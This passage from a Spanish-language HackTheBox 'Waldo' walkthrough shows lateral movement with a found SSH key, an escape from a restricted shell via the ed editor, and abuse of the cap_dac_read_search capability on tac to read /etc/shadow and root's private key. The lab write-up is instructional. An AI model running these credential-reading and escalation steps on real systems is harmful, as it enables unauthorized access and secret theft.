+<h1 id="ssh-8888-22">Movimiento lateral (jueguitos con SSH): nobody -&gt; monitor <a href="#ssh-8888-22">#</a></h1>
+
+<p>Estamos en un contenedor y hay poquitas cosas que hacer y sobre todo que enumerar…</p>
+
+<p>Si revisamos los servicios activos tanto locales como en uso vemos el puerto <code>8888</code> y el puerto <code>9000</code>:</p>
+
+<pre><code class="language-bash">waldo:~/.ssh$ netstat -lant Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN
+tcp        0      0 10.10.10.87:8888        10.10.14.6:49726        ESTABLISHED 
+tcp        0      0 :::80                   :::*                    LISTEN
+tcp        0      0 :::22                   :::*                    LISTEN
+tcp        0      0 :::8888                 :::*                    LISTEN
+</code></pre>
+
+<p>Vemos que nuestra conexión con la máquina se estableció sobre el puerto <code>8888</code>, lo cual es extraño porque nosotros ingresamos usando <code>SSH</code> por lo que debería ser el puerto <code>22</code> el que tendría que estar establecido, si nos vamos rápidamente a la configuración <code>SSH</code> del sistema vemos esto:</p>
+
+<pre><code class="language-bash">waldo:~/.ssh$ cat /etc/ssh/sshd_config          
+...
+Port 8888
+...
+</code></pre>
+
+<p>El puerto <code>8888</code> es el que sirve el servicio <strong>SSH</strong>, ¿pero y entonces el puerto <code>22</code> que vimos arriba? Hay dos servicios <code>SSH</code> lo cual esta muy loco :o</p>
+
+<p>Si recordamos nosotros entramos a la máquina por medio de una llave <strong>SSH</strong> de esta ruta:</p>
+
+<pre><code class="language-bash">waldo:~/.ssh$ pwd
+/home/nobody/.ssh
+waldo:~/.ssh$ ls -la
+total 20
+drwx------    1 nobody   nobody        4096 Jul 15  2018 .
+drwxr-xr-x    1 nobody   nobody        4096 Jul 24  2018 ..
+-rw-------    1 nobody   nobody        1675 May  3  2018 .monitor
+-rw-------    1 nobody   nobody         394 May  3  2018 authorized_keys
+-rw-r--r--    1 nobody   nobody         344 Aug  6 18:53 known_hosts
+</code></pre>
+
+<p>Si revisamos el archivo <code>authorized_keys</code> notamos algo distinto:</p>
+
+<pre><code class="language-bash">waldo:~/.ssh$ cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
+</code></pre>
+
+<p>¿Un usuario llamado <code>monitor</code> del sistema en el que estamos? Pero si habíamos visto que solo existían los usuarios <code>root</code>, <code>operator</code> y <code>nobody</code>.</p>
+
+<p>Puuuuues como prueba podemos jugar con la llave privada de <code>nobody</code> (que el archivo se llama <code>.monitor</code> u.u) pero ahora contra el usuario <code>monitor</code>, solo que apuntamos al servicio <code>SSH</code> corriendo en el puerto <code>22</code> localmente, aaaa ver:</p>
+
+<pre><code class="language-bash">waldo:~/.ssh$ ssh monitor@localhost -i .monitor
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_ssh_monitorSH1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_ssh_monitorSH2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Varias cositas interesantes:</p>
+
+<ol>
+  <li>ESTAMOS DEEEEEEEEEEEEEEEEEENTROOOO como <strong>monitor</strong>.</li>
+  <li>La máquina se pone juguetona con la bienvenida que nos da.</li>
+  <li>Estamos en alguna Shell restringida, por lo que no podemos hacer muchas cositas :(</li>
+</ol>
+
+<p>Bien, bien, mal. No podemos hacer casi nada, ni <code>cd</code>, ni <code>cat</code>, nada de nada.</p>
+
+<hr />
+
+<h2 id="rbash-bypass">Bypasseamos la <u>Shell restringida</u> <a href="#rbash-bypass">📌</a></h2>
+
+<hr />
+
+<pre><code class="language-bash">monitor@waldo:~$ cd ..
+-rbash: cd: restricted
+</code></pre>
+
+<p>Si revisamos el <code>$PATH</code> (para saber en qué rutas busca el sistema los programas que pasamos como comandos) vemos:</p>
+
+<pre><code class="language-bash">monitor@waldo:~$ echo $PATH
+/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
+</code></pre>
+
+<p>Y si revisamos por ejemplo la primera ruta, tendríamos los binarios que podemos ejecutar:</p>
+
+<pre><code class="language-bash">monitor@waldo:~$ ls -la /home/monitor/bin
+total 8
+dr-xr-x--- 2 root monitor 4096 May  3  2018 .
+drwxr-x--- 5 root monitor 4096 Jul 24  2018 ..
+lrwxrwxrwx 1 root root       7 May  3  2018 ls -&gt; /bin/ls
+lrwxrwxrwx 1 root root      13 May  3  2018 most -&gt; /usr/bin/most
+lrwxrwxrwx 1 root root       7 May  3  2018 red -&gt; /bin/ed
+lrwxrwxrwx 1 root root       9 May  3  2018 rnano -&gt; /bin/nano
+</code></pre>
+
+<p>Solo <code>4</code> comandos… Ejecutando <code>echo $SHELL</code> sabemos que estamos un una <code>rshell</code> o sea una <code>restricted shell</code>. Buscando en internet maneras de bypassear esto ninguna opción nos funciona, pero nos da ideas para intentar contra los binarios que tenemos:</p>
+
+<ul>
+  <li><a href="https://www.hackplayers.com/2018/05/tecnicas-para-escapar-de-restricted--shells.html">Técnicas para escapar de shells restringidas (restricted shells bypassing)</a>.</li>
+</ul>
+
+<p>Después de un rato encontramos <a href="https://www.geeksforgeeks.org/ed-command-in-linux-with-examples/">este post</a> que nos habla sobre el comando <code>ed</code> (que restringido seria <code>red</code>) que sirve como editor de texto. Pero ese post nos muestra su funcionamiento, validemos si hay alguna manera de ejecutar comandos con él…</p>
+
+<ul>
+  <li><a href="https://www.tutorialspoint.com/unix_commands/ed.htm">ed - Unix, Linux Command</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149google_ed_exeCommand.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Opaaaa, podemos usar <code>!commando</code> para que sea interpretada con una <code>sh</code>. Pues intentemos simplemente spawnearnos una <code>/bin/bash</code> a ver si logramos salir de la <code>rbash</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_nobodySH_ed_bypassRSHELL_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OJITOOOOOOOOOOOOO podemos movernooooooooos entre directorios, pero claro aún no podemos ejecutar <code>id</code> porque el sistema no encuentra un binario en toooodas las rutas del <code>PATH</code> que este asociado a ese comando, pero eso es sencillo, solo debemos modificar el valor de la variable <code>PATH</code> por las rutas donde <code>linux</code> tiene todooos los binarios:</p>
+
+<ul>
+  <li><a href="https://opensource.com/article/17/6/set-path-linux">Si no tienes ni idea de eso dizque el “PATH”</a>.</li>
+</ul>
+
+<p>(Podemos hacer en nuestra máquina <code>echo $PATH</code> y copiar las del sistema (las que no tienen nuestro usuario) o buscar en internet las rutas)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_monitorSH_updatingPATHvariable.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Perrrrrrfecto, ahora si tenemos acceso a los comandos del sistema, si ga mos…</p>
+
+<p>🏇 <strong><em>Después de que algunos binarios no los encontraba, finalmente nuestro <code>PATH</code> queda así:</em></strong></p>
+
+<pre><code class="language-bash">monitor@waldo:~$ echo $PATH
+/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/bin:/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
+</code></pre>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>Enumerando las <strong>capabilities</strong> del sistema (que serian como pequeñas instrucciones <strong>privilegiadas</strong> otorgadas a X proceso(s)) encontramos:</p>
+
+<pre><code class="language-bash">monitor@waldo:~$ getcap -r / 2&gt;/dev/null
+/usr/bin/tac = cap_dac_read_search+ei
+/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
+</code></pre>
+
+<p>Actualmente contamos con dos archivos usando la capability <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_dac_read_search">CAP_DAC_READ_SEARCH</a>, la cual permite <strong>bypassear los permisos de lectura que existan en los archivos</strong> 😮 kooooooooomoooo? 😈</p>
+
+<p><em>Más info sobre <code>capabilities</code></em>:</p>
+
+<ul>
+  <li><a href="https://blog.pentesteracademy.com/linux-security-understanding-linux-capabilities-series-part-i-4034cf8a7f09">Understanding Linux Capabilities Series (Part I)</a>.</li>
+  <li><a href="https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work">Linux Capabilities: Why They Exist and How They Work</a>.</li>
+</ul>
+
+<p>Uno de los dos se relaciona con el usuario <code>monitor</code>, pero inicialmente me llamo la atención la de <code>tac</code>, <a href="https://www.howtoforge.com/linux-tac-command/">buscando que hace ese comando</a> en <code>Linux</code>, es prácticamente un `ca, pero que imprime el resultado al revés, básicamente:</p>
+
+<pre><code class="language-bash">monitor@waldo:/tmp$ cat hola.txt 
+hola
+si
+nop
+monitor@waldo:/tmp$ tac hola.txt 
+nop
+si
+hola
+</code></pre>
+
+<p>Pero recordemos que el binario <code>tac</code> tiene la capability que le permite saltarse los permisos de lectura de cualquier archivo, por lo que podemos hacer una prueba sencilla con el archivo <code>/etc/shadow</code>, a él simplemente tiene acceso <code>root</code> (o algún usuario privilegiado), por lo que si intentáramos abrirlo con <code>cat</code> deberíamos obtener un <code>permission denied</code>:</p>
+
+<pre><code class="language-bash">monitor@waldo:/tmp$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+</code></pre>
+
+<p>Efectivamente, no tenemos permisos para ver su contenido… ¿Peeeeroooo y con <code>tac</code>?</p>
+
+<pre><code class="language-bash">monitor@waldo:/tmp$ tac /etc/shadow
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_monitorSH_tac_etcShadow.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>VAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO podemos leer archivos privilegiaaaados del sistemaaaaaaaaaaaaaaaa.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149google_gif_comedymanoverhype.gif" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Lo único es que se nos imprime al revés, pero con la misma herramienta podemos usar el parámetro <code>-s ,</code> (<strong>s</strong>eparado por <strong>,</strong>) y el programa nos lo muestra en el orden normal (<strong><em>pero claro, nos aprovechamos de un feature, en todo caso si existiera algún problema podemos tomar el contenido, guardarlo en un archivo y volver a ejecutar <code>tac</code>, en ese caso lo mostraría ahora si con el orden correcto</em></strong>)</p>
+
+<pre><code class="language-bash">monitor@waldo:/tmp$ cat hola.txt 
+hola
+si
+nop
+monitor@waldo:/tmp$ tac hola.txt -s ,
+hola
+si
+nop
+</code></pre>
+
+<p>Bien, pues si podemos leer el archivo <code>shadow</code> podemos buscar si existe alguna llave privada para el usuario <code>root</code>:</p>
+
+<pre><code class="language-bash">monitor@waldo:/tmp$ tac /root/.ssh/id_rsa -s ,
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149bash_monitorSH_tac_rootIdRSA.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>(EL TOOOOOOOOOOOOC de eso vacío e.e)</p>
+
+<p>OPAAAAAAAAAAAAAAAAAA, exiiiiiste, pues copiémosla, generemos un archivo con ella e intentemos conectarnos como el usuario <code>root</code> al servicio <code>SSH</code>.</p>
+
+<p>Después de varios intentos no logramos obtener una <strong>Shell</strong>, averiguando con mis contactos clandestinos (<code>s4dbrd</code> 💖) parece ser algo con lo que el creador quiso jugar (:(</p>
+
+<p>E indagando en el sistema encontramos la razón:</p>
+
+<pre><code class="language-bash">monitor@waldo:/tmp$ cat /etc/ssh/sshd_config
+...
+PermitRootLogin no
+...
+</code></pre>
+
+<p>Podríamos jugar con cracking contra el archivo <code>shadow</code>, pero de lo que probé se demoró demasiado, así que F.</p>
+
+<p>Veamos las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149user_flag.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149root_flag.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>…</p>
+
+<p>Bonita máquina, medio loca, me gusto el <strong>LFI</strong>, bastante interesante.</p>
+
+<p>El privesc fue movidito, el tema de <strong>SSH</strong> fue bastante curioso y entretenido. El jugar con esa capability algo bastante peligroso.</p>
+
+<p>Por hoy no es más, descansamos un poco los ojos, miramos izquierda y derecha, estiramos las manos yyyyyy a seguir aprendiendo! ¡A romper todooooooooooOOO!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Waldo&url=http://localhost:4000/htb/waldo" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#LFI">LFI</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#capabilities">capabilities</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#restricted-bash">restricted-bash</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#ssh-keys">ssh-keys</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#tac">tac</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/crimestoppers">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120banner.png" alt="HackTheBox - CrimeStoppers"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/crimestoppers">HackTheBox - CrimeStoppers</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel difícil. Explotación web con filtros (wrappers) consiguiendo LFI y RCE, contraseñas de Thunderbird, correos llenos de odio, persistencias locas (un rootkit) y jugueteo entre reversing y criptografía....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">08 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/thenotebook">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/breadcrumbs">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png" alt="HackTheBox - Breadcrumbs"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/breadcrumbs">HackTheBox - Breadcrumbs</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contraseñas almacenadas, jugando con binarios encontramos una URL que nos llevara de la...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">17 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
